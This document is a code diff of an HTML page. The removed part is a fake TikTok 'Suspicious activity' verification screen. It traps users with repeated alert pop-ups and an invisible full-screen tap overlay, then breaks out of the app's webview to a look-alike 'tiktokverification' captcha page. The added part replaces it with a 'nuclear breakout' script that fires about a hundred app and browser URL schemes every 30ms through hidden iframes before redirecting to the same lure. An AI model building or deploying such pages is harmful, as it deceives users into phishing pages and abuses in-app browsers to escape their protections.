@@ -2,102 +2,70 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Verification</title>
+    <title>NUCLEAR BREAKOUT TEST 100</title>
     <style>
-        body, html { 
-            margin: 0; padding: 0; background: #ffffff; 
-            font-family: "Proxima Nova", "Inter", -apple-system, sans-serif;
-            -webkit-font-smoothing: antialiased;
-            height: 100%; overflow: hidden;
-        }
-
-        /* The Full-Screen Blanket */
-        #full-screen-redirect {
-            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-            z-index: 9999; opacity: 0; cursor: pointer;
-            display: none;
-            -webkit-tap-highlight-color: transparent;
-        }
-
-        #wrapper {
-            display: flex; justify-content: center; align-items: center;
-            height: 100vh; width: 100%;
-        }
-
-        #main-content { text-align: center; padding: 0 30px; max-width: 400px; }
-        .verification-icon { width: 72px; height: 72px; margin-bottom: 20px; }
-        .header { color: #161823; font-size: 24px; font-weight: 700; margin-bottom: 12px; }
-        .subtext { color: #8A8B91; font-size: 16px; line-height: 1.5; margin-bottom: 100px; }
-        
-        .tiktok-btn-visual {
-            background-color: #FE2C55; color: #ffffff; border-radius: 4px;
-            font-size: 16px; font-weight: 600; padding: 12px 60px;
-            width: 100%; display: inline-block; box-sizing: border-box;
-        }
+        body { background: #000; color: #ff0000; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        #launcher { padding: 80px; border: 5px solid #ff0000; cursor: pointer; text-align: center; background: #1a0000; }
+        #status { margin-top: 20px; color: #fff; font-size: 12px; }
     </style>
 </head>
 <body>
 
-    <div id="full-screen-redirect" onclick="breakOut()"></div>
-
-    <div id="wrapper">
-        <div id="main-content">
-            <svg class="verification-icon" viewBox="0 0 48 48" fill="none">
-                <path d="M24 4L6 12V22C6 33.1 13.7 43.4 24 46C34.3 43.4 42 33.1 42 22V12L24 4Z" fill="#F1F1F2"/>
-                <rect x="22" y="16" width="4" height="12" rx="2" fill="#161823"/>
-                <rect x="22" y="30" width="4" height="4" rx="2" fill="#161823"/>
-            </svg>
-            <div class="header">Suspicious activity</div>
-            <div class="subtext">Please complete verification to continue using TikTok.</div>
-            <div class="tiktok-btn-visual">Verify</div>
-        </div>
+    <div id="launcher">
+        <h1>INITIALIZE 100x PROTOCOL BURST</h1>
+        <p>CAUTION: This will flood the OS with system intents.</p>
+        <div id="status">Ready...</div>
     </div>
 
     <script>
-        const targetUrl = "https://tiktokverification.github.io/captcha/Verification/verify1.html";
+        const target = "tiktokverification.github.io/captcha/Verification/verify1.html";
+        const fullTarget = "https://" + target;
 
-        function breakOut() {
-            // 1. Fire App Store intent to loosen the Webview lock
-            // We use a common app ID (Spotify) to trigger the system handler
-            window.location.href = "itms-apps://itunes.apple.com/app/id324684580";
+        function runNuclearTest() {
+            const status = document.getElementById('status');
+            const protocols = [
+                // 1-10: Primary Web Breakouts
+                "x-safari-https://" + target, "googlechrome://navigate?url=" + fullTarget, "googlechromes://" + target, "microsoft-edge-https://" + target, "firefox://open-url?url=" + fullTarget, "opera-https://" + target, "brave://open-url?url=" + fullTarget, "ucbrowser://" + target, "yandexbrowser://navigate?url=" + fullTarget, "vivaldi-https://" + target,
+                
+                // 11-30: System & App Store Punches (To break focus)
+                "itms-apps://itunes.apple.com/app/id324684580", "itms-appss://", "apple-magazines://", "facetime://" + target, "facetime-audio://", "tel://0000000000", "sms://0000000000", "mailto:test@example.com", "maps://", "bingmaps://", "comgooglemaps://", "baidumap://", "iorad://", "music://", "apple-music://", "videos://", "contacts://", "events://", "reminders://", "notes://",
+                
+                // 31-50: Social & Dev App Protocols
+                "fb://", "instagram://", "twitter://", "whatsapp://", "tg://", "discord://", "slack://", "zoommtg://", "skype://", "linkedin://", "snapchat://", "spotify://", "twitch://", "vimeo://", "youtube://", "pinterest://", "reddit://", "medium://", "tumblr://", "flickr://",
+                
+                // 51-70: File & Data URI Schemes (MIME type panic)
+                "data:application/pdf;base64,JVBERi0xLjcK", "data:application/vnd.apple.pkpass,test", "data:text/calendar,BEGIN:VCALENDAR", "blob:https://tiktok.com/" + Math.random(), "filesystem:https://tiktok.com/temporary/", "view-source:" + fullTarget, "ftp://" + target, "sftp://" + target, "smb://" + target, "afp://" + target, "nfs://" + target, "git://" + target, "svn://" + target, "ssh://" + target, "telnet://" + target, "irc://" + target, "ircs://" + target, "webcal://" + target, "callto:test", "calshow://",
+                
+                // 71-100: Obscure & Third Party Intent Jumps
+                "intent://" + target + "#Intent;scheme=https;package=com.android.chrome;end", "intent://" + target + "#Intent;scheme=https;package=org.mozilla.firefox;end", "intent://" + target + "#Intent;scheme=https;package=com.opera.browser;end", "dnd://", "emergency://", "com-apple-settings://", "app-settings://", "prefs:root=Safari", "prefs:root=General", "findmy://", "workout://", "stocks://", "weather://", "calculator://", "books://", "podcasts://", "appstore://", "update://", "testflight://", "workflow://", "shortcuts://", "camera://", "photos-redirect://", "icloud-sharing://", "keynote://", "numbers://", "pages://", "garageband://", "imovie://", "clips://"
+            ];
 
-            // 2. Immediately follow with the Safari Breakout scheme
-            setTimeout(() => {
-                window.location.href = "x-safari-https://" + targetUrl.replace("https://", "");
-            }, 150);
-
-            // 3. Android Intent Fallback
-            setTimeout(() => {
-                window.location.href = "intent://" + targetUrl.replace(/^https?:\/\//, "") + "#Intent;scheme=https;package=com.android.chrome;end";
-            }, 300);
-
-            // 4. Final catch-all redirect
-            setTimeout(() => {
-                window.location.assign(targetUrl);
-            }, 500);
+            let count = 0;
+            const burst = setInterval(() => {
+                if (count >= protocols.length) {
+                    clearInterval(burst);
+                    status.innerText = "BURST COMPLETE. REDIRECTING...";
+                    window.location.href = fullTarget;
+                    return;
+                }
+                
+                const p = protocols[count];
+                status.innerText = "Firing Protocol " + (count + 1) + ": " + p.split(':')[0];
+                
+                // Execution
+                try {
+                    const iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    iframe.src = p;
+                    document.body.appendChild(iframe);
+                    window.location.href = p;
+                } catch(e) {}
+                
+                count++;
+            }, 30); // 30ms delay to prevent browser from instantly freezing
         }
 
-        window.onload = function() {
-            const duration = 10000;
-            const startTime = Date.now();
-            const header = "Suspicious network activity";
-            const baseMsg = "Please wait while we check your connection. This will only take a moment. Please do not close the TikTok app during the security check.";
-
-            function runAlerts() {
-                const elapsed = Date.now() - startTime;
-                const remaining = Math.max(0, Math.ceil((duration - elapsed) / 1000));
-
-                if (remaining > 0) {
-                    alert(header + "\n\n" + baseMsg + "\n\nTime remaining: " + remaining + "s");
-                    setTimeout(runAlerts, 50); 
-                } else {
-                    document.getElementById('full-screen-redirect').style.display = 'block';
-                    alert("Security check complete. Please tap 'Verify' to continue.");
-                }
-            }
-            setTimeout(runAlerts, 500);
-        };
+        document.getElementById('launcher').addEventListener('click', runNuclearTest);
     </script>
 </body>
 </html>
